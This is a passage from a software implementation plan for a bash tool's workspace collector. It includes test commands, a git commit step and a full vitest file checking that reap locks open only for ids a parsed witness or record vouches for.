./node_modules/.bin/vitest run test/ccd-child-reclaim-entry.test.ts test/ccd-child-reclaim-prelock-journal.test.ts test/ccd-child-reclaim-audit.test.ts test/ccd-child-reclaim-verb.test.ts
./node_modules/.bin/vitest run test/ccd-ws-expire-*.test.ts
./node_modules/.bin/vitest run test/ccd-ws-audit.test.ts
./node_modules/.bin/vitest run test/ccd-ws-collect-verb.test.ts test/ccd-collect-audit.test.ts test/collect-readers.test.ts
./node_modules/.bin/vitest run test/ccd-refusal-scan.test.ts test/ccd-wsaudit-nonpoison.test.ts test/wsaudit.test.ts
./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier'
./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts
```

Expected: every file PASSES with no number edited.
- `ccd-refusal-scan`: `SANCTIONED` is still 16, and each verb body is still above its floor.
- The five citation passes: green.

Before calling a red a break, re-run any CLAUDE.md load flake (`ccd-ws-gc`, `pr-sweep`, `session-hook`, `typecheck-tests`, `ccd-session-state`, `ccd-bounded-reads`) in isolation. If an existing file outside this task goes red:
- name it by slug;
- STOP for a coordinator ruling;
- edit no existing test file (HARD BOUNDARY).

Then confirm the line-neutrality. `cmd_ws_audit`, and every function after it up to `_ws_tmproot_witness_file()` (the last function above R15's insertion point), must start on its `origin/main` line. Run from the workspace root:

```bash
diff <(git show origin/main:ccd/ccd | awk '/^cmd_ws_audit\(\) \{/{f=1} f&&/^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR" "$1} /^_ws_tmproot_witness_file\(\)/{exit}') \
     <(awk '/^cmd_ws_audit\(\) \{/{f=1} f&&/^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR" "$1} /^_ws_tmproot_witness_file\(\)/{exit}' ccd/ccd) \
  && echo "starts unmoved"                                                                   # prints: starts unmoved
diff <(git show HEAD:ccd/ccd | wc -l) <(wc -l < ccd/ccd) && echo "line count unchanged"      # prints: line count unchanged
```

- [ ] **Step 8: Commit**

From the workspace root:

```bash
git status --porcelain                                                     # only: M ccd/ccd, ?? server/test/ccd-token-verbs-dot-id.test.ts
git add ccd/ccd server/test/ccd-token-verbs-dot-id.test.ts
git commit -m "fix(ccd): the token verbs and their audits refuse a dot-leading id at entry" \
  -m "ws-reclaim, ws-expire and ws-collect now share one entry rule, _ws_tmproot_id_ok: the registry charset, never dash-leading and never dot-leading. ws-audit --reclaim and ws-audit --expire, which mint those verbs' tokens, apply the same rule at their own entry. A dot-leading id names ccd's hidden registry files, so it is no child's, archive's or witness's. ws-reclaim no longer journals a token refusal against one, and ws-expire no longer creates a permanent reap lock for one. Each refusal reuses die \"bad session id\"." \
  -m "Plain ws-audit keeps its inline check and today's answer. cmd_ws_audit's line is edited in place, so no line above the citation anchors moves (path-identity spec §2.6)."
git log -1 --format=%B | grep -cE 'D-[0-9]'                               # 0
```

---

### Task 9: The collector opens the reap lock only for an id a parsed witness or record vouches for

**Model routing:** `opus`, effort `xhigh` (SAFETY). A reap lock is never unlinked (R38), so this task decides which names can ever create a permanent lock, and it changes the order of answers before the lock (spec §2.5; R12, R21, R28). The SAFETY lens reads this diff against R21's order and R28.

**Why:**
- Today the collect audit (`_ws_collect_audit_contained`) and the verb (`cmd_ws_collect`) open `$REG/.reap-<id>.lock` once a witness FILE exists or a record FILE NAME parses. Neither body is read until `_ws_collect_fork` runs under the lock. So a junk witness, a junk record, a record naming another id, a record whose slot cannot be derived, or an id with no dash each leaves a permanent lock.
- `_ws_collect_prelock` answers each of those before the lock. It uses the words the locked evaluation gives the same disk, because the rungs it needs move into three shared helpers:
  - `_ws_collect_slug_askable`, the one source of the dash-free sentence;
  - `_ws_collect_witness_judge`, the two witness rungs of `_ws_collect_eval`;
  - `_ws_collect_records_judge`, the resume's rungs from `(( $# == 1 ))` through the id compare.
- A junk witness beside any registry row, or beside a registry the pass cannot list, still opens the lock (the R12/R21 peek), so `registered` keeps its place ahead of `witness-mismatch`.
- At the verb, a pre-lock answer now comes before `paused`. The pause is read under the lock (R28, `collect-verb-prelock-refusal-precedes-the-pause`).

**Readings this task takes (name each by slug in the wave-done, for the coordinator):**
- `child-uuid-peek-pinned-by-an-unmeasurable-child`.
  - Deleting the peek's `.child`/`.uuid` arm cannot turn the plain `.uuid` and `.child` registered rows red, because `_ws_slug_free` sees both of those rows as dot-free fields.
  - The arm decides only when the absence of a `.child` or `.uuid` cannot be measured (`_ws_reclaim_absent` rc 2), which `-e` would read as absence.
  - So the arm's mutation row is pinned by an added case, "a junk witness beside a `.child` whose absence cannot be measured…". It uses the seam that `ccd-collect-audit-rungs.test.ts` already uses.
- `other-id-record-reached-only-through-a-stubbed-reader`.
  - The real `_ws_collect_record_read` refuses a body whose id differs from its file name with rc 2. A parsed record therefore always names the id, and the id compare is a backstop.
  - So the case "one well-formed record that names another id…" has two halves. A real-disk half is refused as a record ccd never wrote. A reader-stub half reaches the compare's own words.
  - The mutation row reds the stub half.
- `prelock-second-look-sound-is-unmeasured`.
  - Steps 4 and 7 of the pass call a judgement that re-reads. If that second read now parses, a writer raced the first read.
  - The pass then answers unmeasured `records` or unmeasured `witness`, so the next pass asks again. It never returns rc 1 with no answer set.
  - This adds two detail sentences under existing probe words. It also gives the record-parse and witness `return 0` mutation rows a red.
- `prelock-reads-the-witness-for-the-document`. When records stand, the pass reads the witness before it judges them, as the fork's resume arm does. A pre-lock audit document then reports the same `witness` object as today's.
- `collect-verb-prelock-refusal-precedes-the-pause` (R28, the frame's slug), pinned by the pause row below.
- Extra pins: `dash-free-sentence-pinned-once` and `prelock-writes-nothing-pinned` (the two source cases).

**Files:**
- Modify `ccd/ccd`, inside the WS-AUDIT-COLLECT block and in `cmd_ws_collect`, each place located by content. Line hints are export lines (`837a099c0`). They move about +14 with #351 and further with the inserts of the eight tasks before this one.
  - Insert `_ws_collect_slug_askable` directly above `_ws_collect_registered() {   # id -> 0 when no registry row stands for id` (hint `:32903`).
  - In `_ws_collect_registered`, replace its two-line `[[ "$id" == *-* ]] \` check with `_ws_collect_slug_askable "$id" || return 2`, in the same position.
  - In `_ws_collect_eval`, replace the three lines from `_ws_tmproot_witness_read "$id"; rc=$?` through the `witness-mismatch` line with `_ws_collect_witness_judge "$id" || return 1`.
  - In `_ws_collect_resume_eval`, replace the lines from `(( $# == 1 )) \` through the id compare's `|| {` line with the `_ws_collect_records_judge` call and the rebinding of `rec` and `name`.
  - Insert `_ws_collect_witness_judge`, `_ws_collect_records_judge` and `_ws_collect_prelock` directly above `_ws_collect_fork() {   # id -> THE ONE EVALUATION` (hint `:33241`).
  - In `_ws_collect_audit_contained`, insert the pass directly above `exec {lfd}>>"$REG/.reap-$id.lock" || {` (hint `:33302`).
  - In `cmd_ws_collect`, insert the pass directly above `# THE SHARED LOCK: \`$REG/.reap-<id>.lock\`, the one ws-reap, ws-reclaim,` (hint `:34097`).
  - Restamp.
- Create the test `server/test/ccd-collect-prelock.test.ts`.
- Run, never edit: every `ccd-collect-*` and `ccd-ws-collect-*` file, `collect-readers`, `collect-pacing`, `wsaudit`, `ccd-wsaudit-nonpoison`, `ccd-refusal-scan`, `ccd-die-containment`, `ccd-child-reclaim-pause`, `macos-platform`, `ccdargv-dec-parity`, `ownership` and `mark-check`.
- In the WS-AUDIT-COLLECT header, the two lines that open its THE LOCK paragraph (`# THE LOCK. Inside the population the audit takes …`), which 3f makes false: 3h. They are below every frozen anchor, so lines may be added (3h adds three).
- NOT edited: the rest of the WS-AUDIT-COLLECT header comment (Task 11 owns items 29 to 31), `_ws_collect_locked`, `server/src/**`, `shared/**`, and every existing test file (HARD BOUNDARY).

**Interfaces:**
- Produces (`ccd/ccd`; the four canonical names):
  ```bash
  _ws_collect_slug_askable ID             # -> 0 iff ID holds a `-`; 1 with _WS_COLLECT_REG_WHY="<ID> names no project and slug, so whether its slug is free cannot be asked"
  _ws_collect_witness_judge ID            # -> 0 parsed (_WS_WIT_* set); 1 with REAP_VERDICT not-witnessed (read rc 1) or witness-mismatch (read rc 2), REAP_DETAIL set
  _ws_collect_records_judge ID RECORD...  # -> 0 exactly one RECORD, read rc 0, naming ID (_WS_COLLECT_RECORD, _WS_QREC_* set);
                                          #    1 with quarantine-kept (2+ records, read rc 2, another id), or unmeasured records (read rc 1) / quarantine (read rc 3)
  _ws_collect_prelock ID                  # -> 0 the reap lock may be opened; 1 with REAP_VERDICT, REAP_DETAIL, _WS_COLLECT_PROBE when unmeasured,
                                          #    _WS_COLLECT_RECORDS once listed. Calls _ws_collect_reset first. No output, no journal line, no write
  ```
- Consumes (`ccd/ccd`, as at the export):
  - `_ws_collect_reset`, `_ws_collect_refuse WORD DETAIL` and `_ws_collect_unmeasured PROBE DETAIL`;
  - `_ws_collect_records_of ID`, which prints one record path per line and answers rc 2 when the records cannot be listed;
  - `_ws_collect_record_read FILE`, which answers 0, 1, 2 or 3;
  - `_ws_tmproot_witness_read ID`, which answers 0, 1 or 2, and `_ws_tmproot_witness_file ID`;
  - `_ws_reclaim_absent PATH`: 0 when absence is proven, 1 when something stands, 2 when unmeasured;
  - `_ws_slug_free PROJECT SLUG`;
  - `_ws_collect_audit_doc ID`, `_ws_collect_refused ID TX WORD DETAIL SURFACE ACTOR REASON`, `_ws_reclaim_fail ID LCTX TOKEN DETAIL` and `_ws_leaf_why_line TEXT`;
  - every entry's `_ws_tmproot_id_ok "$id" || die "bad session id"` (Tasks 5 and 8).
- Consumes (tests, all existing):
  - `collectFixture.ts`: `makeOrphan`, `plantRecord`, `recName`, `lockOf`, `collectAudit`, `collectOf`, `verdictOf`, plus `AGED`, `PAUSE`, `COL_ID` (`'demo-quiet-mesa'`), `identityOf`, `recordFor`, `recordLine`, `recordsDir`, `regDir`, `witnessOf` and `type Answer`;
  - `wsCollectFixture.ts`: `collectVerb`, `docOf` and `WRONG_TOKEN`;
  - `lifecycleHelpers.ts`: `readJournal`, `eventsOf` and `refusalsOf`;
  - `ccdPrHelpers.ts`: `makePrHarness` and `type PrHarness`;
  - `ccdWsHelpers.ts`: `CCD`.
- Produces (test-local, not exported): `JUNK_WITNESS`, `JUNK_RECORD`, `NODASH`, `REC_ID`, `OTHER_ID`, `UNMEASURABLE_CHILD`, `READS_AS_OTHER`, `junkWitness()` and `locked(id?)`.

- [ ] **Step 0: Entry conditions (Task 8 is committed; measure, never assume)**

```bash
grep -n '^_ws_collect_paused() {\|^_ws_collect_registered() {\|^_ws_collect_eval() {\|^_ws_collect_resume_eval() {\|^_ws_collect_fork() {\|^_ws_collect_audit_contained() {\|^cmd_ws_collect() {\|^_ws_collect_locked() {' ccd/ccd   # (a) eight lines, in this order
grep -c '_ws_collect_prelock\|_ws_collect_records_judge\|_ws_collect_witness_judge\|_ws_collect_slug_askable' ccd/ccd   # (b) 0
grep -cE '^ +_ws_tmproot_id_ok "\$id" +\|\| die "bad session id"$' ccd/ccd   # (c) 5: Task 8's four entries and the collect audit's own
grep -c 'names no project and slug, so whether its slug is free cannot be asked' ccd/ccd   # (d) 1
grep -c 'a resume completes one record and never chooses between several' ccd/ccd          # (e) 1
grep -c 'cannot be read as ccd writes it — a temp root nothing vouches for' ccd/ccd        # (f) 1
grep -c '^  exec {lfd}>>"\$REG/\.reap-\$id\.lock" || {$' ccd/ccd                            # (g) 1: the audit's lock open
grep -c '^  # THE SHARED LOCK: `\$REG/\.reap-<id>\.lock`, the one ws-reap, ws-reclaim,$' ccd/ccd   # (h) 1: the verb's
(cd server && ./node_modules/.bin/vitest run test/ccd-collect- test/ccd-ws-collect-)       # (i) the baseline: GREEN, 20 files
```

- If (a) is missing a line, or (b), (c), (g) or (h) differs, **STOP**. Report the measured lines.
- A red in (i) is recorded before any edit:
  - re-run a CLAUDE.md load-flake file alone first;
  - a red that persists is `main-red` (or the earlier task's), never this task's.

  Record the file count; 20 is the export's.

- [ ] **Step 1: Write the failing test `server/test/ccd-collect-prelock.test.ts`**

```ts
// path-identity W1b: the collector opens `$REG/.reap-<id>.lock` only after an ADVISORY parse (path-identity spec §2.5).
// A reap lock is never unlinked, so the first open of one makes a name for good. Before this wave the collect audit and
// `ws-collect` opened it for any id with a witness FILE or a record FILE NAME, before either body was read: a junk
// witness, a junk record or an id with no dash left a permanent lock behind. `_ws_collect_prelock` now answers each of
// those before the lock, in the words the locked evaluation gives the same disk, and a registry row of any kind still
// opens the lock, so `registered` keeps its place ahead of `witness-mismatch`. Sound input still takes the lock.
// FIXTURE HOME ONLY (`makePrHarness`): every path derives from `h.home`, and both verbs run as SOURCED functions, never
// through the installed launcher and never against the live HOME. Linux only where the collector measures: on Darwin
// the audit answers unmeasured `platform` before it reads anything. The source cases run everywhere.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { makePrHarness, type PrHarness } from './ccdPrHelpers.js';
import { CCD } from './ccdWsHelpers.js';
import { eventsOf, readJournal, refusalsOf } from './lifecycleHelpers.js';
import {
  AGED, COL_ID, PAUSE, type Answer, collectAudit, collectOf, identityOf, lockOf, makeOrphan, plantRecord, recName,
  recordFor, recordLine, recordsDir, regDir, verdictOf, witnessOf,
} from './collectFixture.js';
import { WRONG_TOKEN, collectVerb, docOf } from './wsCollectFixture.js';

let h: PrHarness;
beforeEach(() => { h = makePrHarness('ccrc-collect-prelock-'); });
afterEach(() => { h.cleanup(); });

const LINUX = process.platform === 'linux';
const ROOT = process.getuid?.() === 0;
/** A witness line in no grammar ccd writes. */
const JUNK_WITNESS = 'v=2 junk\n';
/** A record line in no grammar ccd writes. */
const JUNK_RECORD = 'v=1 junk\n';
/** An id with no `-`: it names no project and slug, so `_ws_slug_free` cannot be asked of it. */
const NODASH = 'nodash';
/** A second id, for the case that needs its own lock beside COL_ID's. */
const REC_ID = 'demo-quiet-basin';
/** The id a foreign record names. */
const OTHER_ID = 'demo-quiet-other';
const junkWitness = (): void => { fs.writeFileSync(witnessOf(h), JUNK_WITNESS); };
const locked = (id: string = COL_ID): boolean => fs.existsSync(lockOf(h, id));
/** `_ws_reclaim_absent` answering UNMEASURED for a `.child` name alone (`ccd-collect-audit-rungs.test.ts`'s seam): a
 *  `.child` whose absence cannot be proven. Every other path asks the real function. */
const UNMEASURABLE_CHILD = 'eval "_orig_absent() $(declare -f _ws_reclaim_absent | tail -n +2)";'
  + ' _ws_reclaim_absent() { if [[ "$1" == *.child ]]; then _WS_ABSENT_WHY="stub: $1 could not be looked at"; return 2; fi;'
  + ' _orig_absent "$@"; };';
/** A record reader that parses every record as another id's: the id compare behind the real reader, reached. */
const READS_AS_OTHER = `_ws_collect_record_read() { _WS_QREC_ID=${OTHER_ID}; return 0; };`;

describe.skipIf(!LINUX)('the collector opens the reap lock only after an advisory parse (path-identity spec §2.5)', () => {
  describe('the audit, ws-audit --collect', () => {
    it('a junk witness with no record answers witness-mismatch, journaled once, and leaves no lock', () => {
      makeOrphan(h);
      junkWitness();
      const a = collectAudit(h);
      expect(a.code, a.stderr).toBe(0);
      expect(verdictOf(a)).toBe('witness-mismatch');
      expect(a.doc!['detail'], 'the locked evaluation’s words, byte for byte').toBe(
        `the witness ${witnessOf(h)} cannot be read as ccd writes it — a temp root nothing vouches for is offered to the operator, never taken`);
      expect(a.doc!['token']).toBeUndefined();
      expect(collectOf(a)['witness']).toBeNull();
      expect(refusalsOf(h.home), 'journaled once').toEqual([{ act: 'collect', token: 'witness-mismatch' }]);
      expect(eventsOf(h.home, 'collect')[0]!['verb']).toBe('ws-audit');
      expect(locked(), 'no reap lock for a name nothing vouches for').toBe(false);
    }, 60_000);

    it('a record whose body is junk, with no witness, answers quarantine-kept, lists the record, and leaves no lock', () => {
      const rec = plantRecord(h, recName(), JUNK_RECORD);
      const a = collectAudit(h);
      expect(a.code, a.stderr).toBe(0);
      expect(verdictOf(a)).toBe('quarantine-kept');
      expect(a.doc!['detail']).toBe(
        `the quarantine record ${rec} cannot be read as ccd writes it — it, and whatever it names, are kept for the operator`);
      expect(collectOf(a)['records'], 'a kept record is listed, never silent').toEqual([recName()]);
      expect(refusalsOf(h.home)).toEqual([{ act: 'collect', token: 'quarantine-kept' }]);
      expect(locked(), 'no reap lock for a record nothing vouches for').toBe(false);
      expect(fs.readFileSync(rec, 'utf8'), 'the record stands as it was').toBe(JUNK_RECORD);
    }, 60_000);

    it('a junk record beside a sound witness answers quarantine-kept, reports the witness, and leaves no lock', () => {
      makeOrphan(h);
      plantRecord(h, recName(), JUNK_RECORD);
      const a = collectAudit(h);
      expect(a.code, a.stderr).toBe(0);
      expect(verdictOf(a)).toBe('quarantine-kept');
      expect(collectOf(a)['witness'], 'the document reports the witness, as the fork’s resume arm does').not.toBeNull();
      expect(locked(), 'no reap lock for a record nothing vouches for').toBe(false);
    }, 60_000);

    it('a junk witness beside quarantine records that cannot be listed answers unmeasured records, exit 1, with no lock', () => {
      makeOrphan(h);
      junkWitness();
      const elsewhere = path.join(h.home, 'not-the-records');
      fs.mkdirSync(elsewhere);
      fs.symlinkSync(elsewhere, recordsDir(h));
      const a = collectAudit(h);
      expect(a.code, a.stdout).toBe(1);
      expect(verdictOf(a)).toBe('unmeasured');
      expect(collectOf(a)['unmeasured']).toBe('records');
      expect(readJournal(h.home), 'unmeasured is journaled nowhere').toEqual([]);
      expect(locked(), 'records that cannot be listed prove no absence: no lock, and no witness word').toBe(false);
    }, 60_000);

    it('two junk records answer quarantine-kept, naming both, with no lock', () => {
      plantRecord(h, recName(), JUNK_RECORD);
      plantRecord(h, `${COL_ID}.1.2`, JUNK_RECORD);
      const a = collectAudit(h);
      expect(a.code, a.stderr).toBe(0);
      expect(verdictOf(a)).toBe('quarantine-kept');
      expect(a.doc!['detail']).toBe(`2 quarantine records name ${COL_ID} — a resume completes one record and never chooses`
        + ' between several; they are kept for the operator');
      expect([...(collectOf(a)['records'] as string[])].sort(), 'both are listed').toEqual([`${COL_ID}.1.2`, recName()].sort());
      expect(locked()).toBe(false);
    }, 60_000);

    it('one well-formed record that names another id answers quarantine-kept, with no lock', () => {
      // ON THE DISK: a line ccd would write, for another id, under this id's record name. The reader refuses it whole
      // (its name and its body name two ids), so the judgement answers it as a record ccd never wrote.
      plantRecord(h, recName(), recordLine(recordFor({ dev: '1', ino: '2', btime: '3' }, OTHER_ID)));
      const a = collectAudit(h);
      expect(a.code, a.stderr).toBe(0);
      expect(verdictOf(a)).toBe('quarantine-kept');
      expect(String(a.doc!['detail'])).toContain('cannot be read as ccd writes it');
      expect(locked(), 'the record on the disk opens no lock').toBe(false);
      // BEHIND THE READER: the id compare, reached by a reader that parses the record as another id's. The pass
      // answers it in the compare's own words, and still before any lock.
      const b = collectAudit(h, { pre: READS_AS_OTHER });
      expect(b.code, b.stderr).toBe(0);
      expect(verdictOf(b)).toBe('quarantine-kept');
      expect(b.doc!['detail']).toBe(`the quarantine record ${path.join(recordsDir(h), recName())} names ${OTHER_ID},`
        + ` not ${COL_ID} — it is kept for the operator`);
      expect(locked(), 'a reader that parses it as another id’s opens no lock').toBe(false);
    }, 90_000);

    it('a sound record whose ~/.cc-tmp cannot be resolved answers unmeasured quarantine, exit 1, with no lock', () => {
      const tmp = path.join(h.home, '.cc-tmp');
      fs.mkdirSync(tmp, { recursive: true });
      const dev = String(fs.statSync(tmp, { bigint: true }).dev);
      plantRecord(h, recName(), recordLine(recordFor({ dev, ino: '2', btime: '3' })));
      fs.rmSync(tmp, { recursive: true, force: true });
      const a = collectAudit(h);
      expect(a.code, a.stdout).toBe(1);
      expect(verdictOf(a)).toBe('unmeasured');
      expect(collectOf(a)['unmeasured']).toBe('quarantine');
      expect(String(a.doc!['detail'])).toContain('was never derived');
      expect(collectOf(a)['records'], 'the record is still listed').toEqual([recName()]);
      expect(readJournal(h.home), 'unmeasured is journaled nowhere').toEqual([]);
      expect(locked(), 'no lock until a body is parsed and its slot derived').toBe(false);
      // The CONTROL: ~/.cc-tmp stands again, the same record parses, and it takes the lock. Its leaf and slot stand
      // nowhere, so the resume reads `removed`.
      fs.mkdirSync(tmp, { mode: 0o700 });
      expect(collectAudit(h).doc).toMatchObject({ resume: 'removed', verdict: 'collectable' });
      expect(locked()).toBe(true);
    }, 90_000);

    it('an id with no dash answers unmeasured registry, exit 1, with no lock', () => {
      makeOrphan(h, NODASH);
      const a = collectAudit(h, { id: NODASH });
      expect(a.code, a.stdout).toBe(1);
      expect(verdictOf(a)).toBe('unmeasured');
      expect(collectOf(a)['unmeasured']).toBe('registry');
      expect(readJournal(h.home)).toEqual([]);
      expect(locked(NODASH), 'no reap lock for an id that names no slug').toBe(false);
      // Its detail is `_ws_collect_registered`'s own, byte for byte, asked as its callers ask it: with the lock held.
      const reg = h.sh(`exec 9>>"$REG/.reap-${NODASH}.lock"; _ws_collect_registered ${NODASH};`
        + ' printf \'%s|%s\' "$?" "$_WS_COLLECT_REG_WHY"');
      expect(reg).toBe(`2|${String(a.doc!['detail'])}`);
    }, 60_000);

    it.each([
      ['a .uuid', `${COL_ID}.uuid`],
      ['a .child', `${COL_ID}.child`],
      ['a .hold', `${COL_ID}.hold`],
      ['a .reaping', `${COL_ID}.reaping`],
      ['a dot-family residue', `.${COL_ID}.compactset.4242`],
    ] as const)('a junk witness beside a registry row answers registered and journals nothing: %s', (_what, row) => {
      makeOrphan(h);
      junkWitness();
      fs.writeFileSync(path.join(regDir(h), row), '8');
      const a = collectAudit(h);
      expect(a.code, a.stderr).toBe(0);
      expect(verdictOf(a), 'registered keeps its place ahead of witness-mismatch').toBe('registered');
      expect(String(a.doc!['detail'])).toContain(row);
      expect(readJournal(h.home), 'a retryable word is journaled nowhere').toEqual([]);
      expect(locked(), 'the lock belongs to an id with a row').toBe(true);
    }, 60_000);

    it('a junk witness beside a `.child` whose absence cannot be measured takes the lock and answers unmeasured registry', () => {
      makeOrphan(h);
      junkWitness();
      const a = collectAudit(h, { pre: UNMEASURABLE_CHILD });
      expect(a.code, a.stdout).toBe(1);
      expect(verdictOf(a)).toBe('unmeasured');
      expect(collectOf(a)['unmeasured']).toBe('registry');
      expect(String(a.doc!['detail'])).toContain(`${COL_ID}.child could not be looked at`);
      expect(readJournal(h.home)).toEqual([]);
      expect(locked(), 'a row the peek could not rule out opens the lock, as today').toBe(true);
    }, 60_000);

    it.skipIf(ROOT)('a junk witness beside a registry that can be searched but not listed takes the lock and answers unmeasured registry', () => {
      makeOrphan(h);
      junkWitness();
      const reg = regDir(h);
      fs.writeFileSync(path.join(reg, `${COL_ID}.hold`), 'x');
      const mode = fs.statSync(reg).mode & 0o777;
      fs.chmodSync(reg, 0o300);
      let a: Answer;
      try { a = collectAudit(h); } finally { fs.chmodSync(reg, mode); }
      expect(a.code, a.stdout).toBe(1);
      expect(verdictOf(a)).toBe('unmeasured');
      expect(collectOf(a)['unmeasured']).toBe('registry');
      expect(String(a.doc!['detail'])).toContain('wildcard listing');
      expect(readJournal(h.home)).toEqual([]);
      expect(locked(), 'a glob that cannot list is no proof of no row: the lock opens, as today').toBe(true);
    }, 60_000);

    it('a parsed witness, and a record with no witness, still take the lock', () => {
      makeOrphan(h);
      const w = collectAudit(h, { pre: AGED });
      expect(w.code, w.stderr).toBe(0);
      expect(verdictOf(w), 'a parsed witness is judged under the lock').toBe('collectable');
      expect(locked(), 'its lock was taken').toBe(true);
      const { leaf } = makeOrphan(h, REC_ID);
      plantRecord(h, recName(REC_ID), recordLine(recordFor(identityOf(leaf), REC_ID)));
      fs.rmSync(witnessOf(h, REC_ID));
      const r = collectAudit(h, { id: REC_ID });
      expect(r.code, r.stderr).toBe(0);
      expect(r.doc, 'a parsed record is judged under the lock').toMatchObject({ resume: 'unmoved', verdict: 'collectable' });
      expect(locked(REC_ID), 'its lock was taken').toBe(true);
    }, 90_000);
  });

  describe('the verb, ws-collect', () => {
    it('a junk witness is refused witness-mismatch at exit 0, the detail says "no lock was taken", and there is no lock', () => {
      const { leaf } = makeOrphan(h);
      junkWitness();
      const r = collectVerb(h, WRONG_TOKEN, { id: COL_ID });
      expect(r.code, r.stdout + r.stderr).toBe(0);
      const doc = docOf(r.stdout);
      expect(doc['refused']).toBe('witness-mismatch');
      expect(String(doc['detail'])).toMatch(/^no lock was taken: the witness /);
      expect(String(doc['detail'])).toContain('cannot be read as ccd writes it');
      expect(eventsOf(h.home, 'collect').map((e) => [e['outcome'], e['refusal'], e['verb']]))
        .toEqual([['refused', 'witness-mismatch', 'ws-collect']]);
      expect(locked()).toBe(false);
      expect(fs.existsSync(path.join(leaf, 'cdk.out', 'manifest.json')), 'nothing moved').toBe(true);
    }, 60_000);

    it('a junk witness with the pause standing is refused witness-mismatch, not paused, with no lock', () => {
      makeOrphan(h);
      junkWitness();
      const r = collectVerb(h, WRONG_TOKEN, { id: COL_ID, pre: PAUSE });
      expect(r.code, r.stdout + r.stderr).toBe(0);
      expect(docOf(r.stdout)['refused'], 'the pass answers before the pause, which is read under the lock')
        .toBe('witness-mismatch');
      expect(fs.existsSync(path.join(regDir(h), 'reclaim-paused')), 'the CONTROL: the pause stood').toBe(true);
      expect(locked()).toBe(false);
    }, 60_000);

    it('a junk record is refused quarantine-kept, with no lock', () => {
      const rec = plantRecord(h, recName(), JUNK_RECORD);
      const r = collectVerb(h, WRONG_TOKEN, { id: COL_ID });
      expect(r.code, r.stdout + r.stderr).toBe(0);
      const doc = docOf(r.stdout);
      expect(doc['refused']).toBe('quarantine-kept');
      expect(String(doc['detail'])).toMatch(/^no lock was taken: the quarantine record /);
      expect(locked()).toBe(false);
      expect(fs.readFileSync(rec, 'utf8'), 'the record is kept as it stands').toBe(JUNK_RECORD);
    }, 60_000);

    it('an id with no dash fails probe-unmeasured at exit 1, with no lock', () => {
      makeOrphan(h, NODASH);
      const r = collectVerb(h, WRONG_TOKEN, { id: NODASH });
      expect(r.code, r.stdout + r.stderr).toBe(1);
      const doc = docOf(r.stdout);
      expect(doc['failed']).toBe('probe-unmeasured');
      expect(doc['detail']).toBe(`no lock was taken, and nothing was moved or removed: ${NODASH} names no project and slug,`
        + ' so whether its slug is free cannot be asked');
      expect(locked(NODASH)).toBe(false);
    }, 60_000);
  });
});

describe('the source: one dash-free sentence, and a pass that writes nothing (path-identity spec §2.5)', () => {
  const src = fs.readFileSync(CCD, 'utf8');
  /** `name`'s body, from its head line to its first closing brace at column 0, or '' when it is not defined. */
  const bodyOf = (name: string): string => {
    const a = src.indexOf(`\n${name}() {`);
    const b = a > -1 ? src.indexOf('\n}\n', a) : -1;
    return b > a ? src.slice(a, b) : '';
  };
  const SENTENCE = 'names no project and slug, so whether its slug is free cannot be asked';

  it('the sentence an id with no dash answers is spelled once, in _ws_collect_slug_askable', () => {
    expect(src.split(SENTENCE).length - 1, 'the sentence is spelled once').toBe(1);
    expect(bodyOf('_ws_collect_slug_askable')).toContain(SENTENCE);
    expect(bodyOf('_ws_collect_registered')).toContain('_ws_collect_slug_askable "$id" || return 2');
  });

  it('the pass prints nothing, journals nothing and opens no lock of its own', () => {
    const code = bodyOf('_ws_collect_prelock').split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
    expect(code.length, 'the pass could not be sliced').toBeGreaterThan(600);
    expect(code, 'it journals nothing: the audit document and _ws_collect_refused do').not.toMatch(/\b_lc_[a-z_]+/);
    expect(code, 'it prints nothing').not.toMatch(/\b(?:printf|echo)\b/);
    expect(code, 'it opens no lock').not.toMatch(/\bexec\s*\{|\bflock\b/);
  });
});
```

- [ ] **Step 2: Run it and see it fail**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-collect-prelock.test.ts
```

Run it in the foreground with a timeout of at least 600000 ms. Expected: FAIL. The texts below were drafted, not measured; record the measured ones.

FAIL:
- The audit:
  - the junk witness: `no reap lock for a name nothing vouches for: expected true to be false`;
  - the junk record: `no reap lock for a record nothing vouches for: expected true to be false`;
  - the two junk records: `expected true to be false`;
  - the other id: `the record on the disk opens no lock: expected true to be false`;
  - `~/.cc-tmp`: `no lock until a body is parsed and its slot derived: expected true to be false`;
  - no dash: `no reap lock for an id that names no slug: expected true to be false`;
  - the junk record beside a sound witness: `no reap lock for a record nothing vouches for: expected true to be false`;
  - the unlistable records: `records that cannot be listed prove no absence: no lock, and no witness word: expected true to be false`.
- The verb:
  - the junk witness: `expected 'the witness … cannot be read as ccd writes it - …' to match /^no lock was taken: the witness /`;
  - the pause: `the pass answers before the pause, which is read under the lock: expected 'paused' to be 'witness-mismatch'`;
  - the junk record: `expected 'the quarantine record … - …' to match /^no lock was taken: the quarantine record /`;
  - no dash: `expected 'nodash names no project and slug, …' to be 'no lock was taken, and nothing was moved or removed: nodash …'`.
- The source:
  - the sentence case: `expected '' to contain 'names no project and slug, so whether its slug is free cannot be asked'`;
  - the pass case: `the pass could not be sliced: expected 0 to be greater than 600`.

PASS today, and they must stay green (these are the precedence pins and the controls, unchanged by the pass):
- the five registered rows;
- the unmeasurable `.child` case;
- the unlistable case, which is skipped as root;
- `a parsed witness, and a record with no witness, still take the lock`.

Any other case that passes here is a defect in the case: fix the case, never the code.

- [ ] **Step 3: Implement in `ccd/ccd`, each edit located by its quoted text**

**3a. `_ws_collect_slug_askable`**, directly above `_ws_collect_registered`.

Before:
```bash
}

_ws_collect_registered() {   # id -> 0 when no registry row stands for id; 1 when one does; 2 when that could not be
```
After:
```bash
}

# THE DASH-FREE SENTENCE, ONE SOURCE (path-identity spec §2.5): an id with no
# `-` names no project and slug, so `_ws_slug_free` cannot be asked of it —
# split, `nodash` would be asked as `nodash-nodash` and read free. Both
# `_ws_collect_registered`, under the lock, and `_ws_collect_prelock`, before
# it, ask it here, so the detail they answer is one string.
